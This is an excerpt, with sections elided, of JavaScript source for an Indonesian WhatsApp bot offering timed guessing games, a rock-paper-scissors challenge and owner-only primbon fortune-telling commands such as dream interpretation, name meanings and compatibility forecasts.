                    zallmods.sendText(from, `Silahkan Jawab Pertanyaan Berikut\n\n${result.soal}\nWaktu : 60s`, m).then(() => {
                    tebakkata[m.sender.split('@')[0]] = result.jawaban.toLowerCase()
                    })
                    await sleep(60000)
                    if (tebakkata.hasOwnProperty(m.sender.split('@')[0])) {
                    console.log("Jawaban: " + result.jawaban)
                    zallmods.sendButtonText(from, [{ buttonId: 'tebak kata', buttonText: { displayText: 'Tebak Kata' }, type: 1 }], `Waktu Habis\nJawaban:  ${tebakkata[m.sender.split('@')[0]]}\n\nIngin bermain? tekan button dibawah`, zallmods.user.name, m)
                    delete tebakkata[m.sender.split('@')[0]]
                    }
                    ...
                    console.log("Jawaban: " + result.jawaban)
                    zallmods.sendButtonText(from, [{ buttonId: 'tebak kalimat', buttonText: { displayText: 'Tebak Kalimat' }, type: 1 }], `Waktu Habis\nJawaban:  ${tebakkalimat[m.sender.split('@')[0]]}\n\nIngin bermain? tekan button dibawah`, zallmods.user.name, m)
                    delete tebakkalimat[m.sender.split('@')[0]]
                    }
                    ...
                    let result = anu[Math.floor(Math.random() * anu.length)]
                    zallmods.sendText(from, `Ini Adalah Lirik Dari Lagu? : *${result.soal}*?\nWaktu : 60s`, m).then(() => {
                    tebaklirik[m.sender.split('@')[0]] = result.jawaban.toLowerCase()
                    })
                    await sleep(60000)
                    if (tebaklirik.hasOwnProperty(m.sender.split('@')[0])) {
                    console.log("Jawaban: " + result.jawaban)
                    zallmods.sendButtonText(from, [{ buttonId: 'tebak lirik', buttonText: { displayText: 'Tebak Lirik' }, type: 1 }], `Waktu Habis\nJawaban:  ${tebaklirik[m.sender.split('@')[0]]}\n\nIngin bermain? tekan button dibawah`, zallmods.user.name, m)
                    delete tebaklirik[m.sender.split('@')[0]]
                    }
                    ...
                    let result = anu[Math.floor(Math.random() * anu.length)]
                    zallmods.sendText(from, `*Jawablah Pertanyaan Berikut :*\n${result.soal}*\nWaktu : 60s`, m).then(() => {
		    ...
		    caklontong_desk[m.sender.split('@')[0]] = result.deskripsi
                    ...
                    console.log("Jawaban: " + result.jawaban)
                    zallmods.sendButtonText(from, [{ buttonId: 'tebak lontong', buttonText: { displayText: 'Tebak Lontong' }, type: 1 }], `Waktu Habis\nJawaban:  ${caklontong[m.sender.split('@')[0]]}\nDeskripsi : ${caklontong_desk[m.sender.split('@')[0]]}\n\nIngin bermain? tekan button dibawah`, zallmods.user.name, m)
                    delete caklontong[m.sender.split('@')[0]]
		    delete caklontong_desk[m.sender.split('@')[0]]
                    }
                }
            ...
            if (!isCreator) return m.reply(mess.owner)
                ...
                zallmods.sendText(from, `*Berapa hasil dari: ${result.soal.toLowerCase()}*?\n\nWaktu: ${(result.waktu / 1000).toFixed(2)} detik`, m).then(() => {
...
Silahkan @${m.mentionedJid[0].split`@`[0]} untuk ketik terima/tolak`
            this.suit[id] = {
            chat: await zallmods.sendText(from, caption, m, { mentions: parseMention(caption) }),
            id: id,
            p: m.sender,
            p2: m.mentionedJid[0],
            status: 'wait',
            waktu: setTimeout(() => {
            if (this.suit[id]) zallmods.sendText(from, `_Waktu suit habis_`, m)
            delete this.suit[id]
            ...
            if (!isCreator) return m.reply(mess.owner)
                ...
                zallmods.sendText(from, `⭔ *Mimpi :* ${anu.message.mimpi}\n⭔ *Arti :* ${anu.message.arti}\n⭔ *Solusi :* ${anu.message.solusi}`, m)
            }
            break
            case 'ramalanjodoh': case 'ramaljodoh': {
            if (!isCreator) return m.reply(mess.owner)
                if (!text) throw `Example : ${prefix + command} zallmods, 7, 7, 2005, Novia, 16, 11, 2004`
                let [nama1, tgl1, bln1, thn1, nama2, tgl2, bln2, thn2] = text.split`,`
                let anu = await primbon.ramalan_jodoh(nama1, tgl1, bln1, thn1, nama2, tgl2, bln2, thn2)
                if (anu.status == false) return m.reply(anu.message)
                zallmods.sendText(from, `⭔ *Nama Anda :* ${anu.message.nama_anda.nama}\n⭔ *Lahir Anda :* ${anu.message.nama_anda.tgl_lahir}\n⭔ *Nama Pasangan :* ${anu.message.nama_pasangan.nama}\n⭔ *Lahir Pasangan :* ${anu.message.nama_pasangan.tgl_lahir}\n⭔ *Hasil :* ${anu.message.result}\n⭔ *Catatan :* ${anu.message.catatan}`, m)
            }
            break
case 'artinama': {
if (!isCreator) return m.reply(mess.owner)
                if (!text) throw `Example : ${prefix + command} zallmods Hw`
                let anu = await primbon.arti_nama(text)
                if (anu.status == false) return m.reply(anu.message)
                zallmods.sendText(from, `⭔ *Nama :* ${anu.message.nama}\n⭔ *Arti :* ${anu.message.arti}\n⭔ *Catatan :* ${anu.message.catatan}`, m)
            }
            break
            case 'kecocokannama': case 'cocoknama': {
            if (!isCreator) return m.reply(mess.owner)
                if (!text) throw `Example : ${prefix + command} zallmods, 7, 7, 2005`
            ...
            if (!isCreator) return m.reply(mess.owner)
                if (!text) throw `Example : ${prefix + command} zallmods|Novia`
                let [nama1, nama2] = text.split`|`
                let anu = await primbon.kecocokan_nama_pasangan(nama1, nama2)
                if (anu.status == false) return m.reply(anu.message)
                zallmods.sendImage(from,  anu.message.gambar, `⭔ *Nama Anda :* ${anu.message.nama_anda}\n⭔ *Nama Pasangan :* ${anu.message.nama_pasangan}\n⭔ *Sisi Positif :* ${anu.message.sisi_positif}\n⭔ *Sisi Negatif :* ${anu.message.sisi_negatif}`, m)
            }
            break
            ...
            if (!isCreator) return m.reply(mess.owner)
                ...
                if (anu.status == false) return m.reply(anu.message)
                zallmods.sendText(from, `⭔ *Tanggal Pernikahan :* ${anu.message.tanggal}\n⭔ *karakteristik :* ${anu.message.karakteristik}`, m)
            }
            break
            case 'sifatusaha': {
            if (!isCreator) return m.reply(mess.owner)
                ...
                if (anu.status == false) return m.reply(anu.message)
                zallmods.sendText(from, `⭔ *Lahir :* ${anu.message.hari_lahir}\n⭔ *Usaha :* ${anu.message.usaha}`, m)
            }
            break
            ...
            if (!isCreator) return m.reply(mess.owner)
                ...
                if (anu.status == false) return m.reply(anu.message)
                zallmods.sendText(from, `⭔ *Analisa :* ${anu.message.analisa}\n⭔ *Angka Akar :* ${anu.message.angka_akar}\n⭔ *Sifat :* ${anu.message.sifat}\n⭔ *Elemen :* ${anu.message.elemen}\n⭔ *Angka Keberuntungan :* ${anu.message.angka_keberuntungan}`, m)
            }
            break
            ...
            if (!isCreator) return m.reply(mess.owner)
                ...
                if (anu.status == false) return m.reply(anu.message)
                zallmods.sendImage(from, anu.message.image, `⭔ *Lahir :* ${anu.message.tgl_lahir}\n⭔ *Simbol Tarot :* ${anu.message.simbol_tarot}\n⭔ *Arti :* ${anu.message.arti}\n⭔ *Catatan :* ${anu.message.catatan}`, m)
            }
            break
            case 'fengshui': {
            if (!isCreator) return m.reply(mess.owner)
                if (!text) throw `Example : ${prefix + command} zallmods, 1, 2005\n\nNote : ${prefix + command} Nama, gender, tahun lahir\nGender : 1 untuk laki-laki & 2 untuk perempuan`
            ...
            if (!isCreator) return m.reply(mess.owner)
                ...
                if (anu.status == false) return m.reply(anu.message)
                zallmods.sendText(from, `⭔ *Lahir :* ${anu.message.tgl_lahir}\n⭔ *Kala Tinantang :* ${anu.message.kala_tinantang}\n⭔ *Info :* ${anu.message.info}\n⭔ *Catatan :* ${anu.message.catatan}`, m)
            }
            break
            ...
            if (!isCreator) return m.reply(mess.owner)
                ...
                if (anu.status == false) return m.reply(anu.message)
                zallmods.sendText(from, `⭔ *Hari Lahir :* ${anu.message.hari_lahir}\n⭔ *Tanggal Lahir :* ${anu.message.tgl_lahir}\n⭔ *Hari Naas :* ${anu.message.hari_naas}\n⭔ *Info :* ${anu.message.catatan}\n⭔ *Catatan :* ${anu.message.info}`, m)
            }
            break
            ...
            case 'peruntungan': {
            if (!isCreator) return m.reply(mess.owner)
                if (!text) throw `Example : ${prefix + command} zallmods, 7, 7, 2005, 2022\n\nNote : ${prefix + command} Nama, tanggal lahir, bulan lahir, tahun lahir, untuk tahun`
            ...
            if (!isCreator) return m.reply(mess.owner)
                ...
                if (anu.status == false) return m.reply(anu.message)
                zallmods.sendText(from, `⭔ *Tanggal :* ${anu.message.tanggal}\n⭔ *Jumlah Neptu :* ${anu.message.jumlah_neptu}\n⭔ *Watak Hari :* ${anu.message.watak_hari}\n⭔ *Naga Hari :* ${anu.message.naga_hari}\n⭔ *Jam Baik :* ${anu.message.jam_baik}\n⭔ *Watak Kelahiran :* ${anu.message.watak_kelahiran}`, m)
            }
            break
            ...
            if (!isCreator) return m.reply(mess.owner)
                ...
                if (anu.status == false) return m.reply(anu.message)
                zallmods.sendText(from, `⭔ *Tanggal :* ${anu.message.tgl_memancing}\n⭔ *Hasil :* ${anu.message.result}\n⭔ *Catatan :* ${anu.message.catatan}`, m)
            }
            break
            case 'masasubur': {
            if (!isCreator) return m.reply(mess.owner)
                ...
                if (anu.status == false) return m.reply(anu.message)
                zallmods.sendText(from, `⭔ *Hasil :* ${anu.message.result}\n⭔ *Catatan :* ${anu.message.catatan}`, m)
            }
            break
            ...
            case 'shio': {
                ...
                if (anu.status == false) return m.reply(anu.message)
                zallmods.sendText(from, `⭔ *Hasil :* ${anu.message}`, m)
            }
            break
...
zallmods.copyNForward(from, msgs[budy.toLowerCase()], true)}}
} catch (err) {
